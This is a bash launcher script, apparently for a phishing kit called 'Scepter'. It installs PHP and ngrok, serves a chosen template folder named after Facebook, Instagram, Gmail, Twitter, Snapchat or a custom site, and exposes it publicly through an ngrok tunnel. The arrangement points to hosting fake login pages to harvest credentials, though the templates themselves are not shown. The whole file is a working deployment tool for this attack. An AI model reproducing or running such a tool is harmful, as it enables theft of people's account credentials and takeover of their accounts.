#! /bin/bash
#triiixter

killall -9 php > /dev/null 2>&1
killall -9 ngrok > /dev/null 2>&1
rm ngrok-stable-linux-arm.zip > /dev/null 2>&1
rm ngrok-stable-linux-386.zip > /dev/null 2>&1
function banner()
{
echo -e "\e[92m  ____                 _            "
echo -e "\e[92m / ___|  ___ ___ _ __ | |_ ___ _ __  "
echo -e "\e[92m \___ \ / __/ _ \ '_ \| __/ _ \ '__|"
echo -e "\e[92m  ___) | (_|  __/ |_) | ||  __/ |   "
echo -e "\e[92m |____/ \___\___| .__/ \__\___|_| v1   "
echo -e "\e[92m                |_|                "

echo -e "                     \e[96m*by triiixter"
}
function check()
{
echo "Checking Dependencies..."
echo -ne '--------------------------  (00%)\r'
apt-get install php -y >/dev/null 2>&1
echo -ne '#####---------------------  (33%)\r'
apt-get install zip unzip -y > /dev/null 2>&1
echo -ne '#############-------------  (66%)\r'
if [[ -e ngrok ]]
then continue > /dev/null 2>&1
else
echo "Which Terminal you are using ?"
echo "1) Termux"
echo "2) Linux terminal"
read terminal
clear
banner
echo -ne '#############-------------  (66%)\r'
if [[ $terminal == 1 ]]
then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1 
unzip ngrok-stable-linux-arm.zip >/dev/null 2>&1
echo -ne '####################------  (88%)\r'
sleep 3
rm ngrok-stable-linux-arm.zip 
chmod 777 ngrok
echo -ne '#########################  (100%)\r'
elif [[ $terminal == 2 ]]
then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
unzip ngrok-stable-linux-386.zip >/dev/null 2>&1
echo -ne '####################------  (88%)\r'
sleep 3
rm ngrok-stable-linux-386.zip 
chmod 777 ngrok
echo -ne '#########################  (100%)\r'
else 
echo "Invalid Option"
echo "Restarting script in 3"&
sleep 3
./scepter.sh
fi
fi
}

function start()
{
cd templates/$server
echo -e "\e[35mStarting PHP server..."&
sleep 2
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2
echo -e "\e[92mPHP Server is live !"
cd ..
cd ..
echo -e "\e[35mStarting NGROK tunell..."&
sleep 3
./ngrok http 8080

}
function menu()
{
clear
banner
echo -e "\e[35mChoose Template"
echo -e "\e[93m(1) Facebook"
echo -e "\e[93m(2) Instagram"
echo -e "\e[93m(3) Gmail"
echo -e "\e[93m(4) Twitter"
echo -e "\e[93m(5) Snapchat"
echo -e "\e[93m(6) Custom"
read option
if [[ $option == 1 ]]
then
    server="facebook"
    start
elif [[ $option == 2 ]]
then
    server="instagram"
    start
elif [[ $option == 3 ]]
then
    server="gmail" 
    start  
elif [[ $option == 4 ]]
then   
    server="twitter" 
    start 
elif [[ $option == 5 ]]
then   
    server="snapchat" 
    start 
elif [[ $option == 6 ]]
then   
    server="Custom" 
    start
else 
    echo "wrong button dude" 
fi
}
clear
banner
check
menu
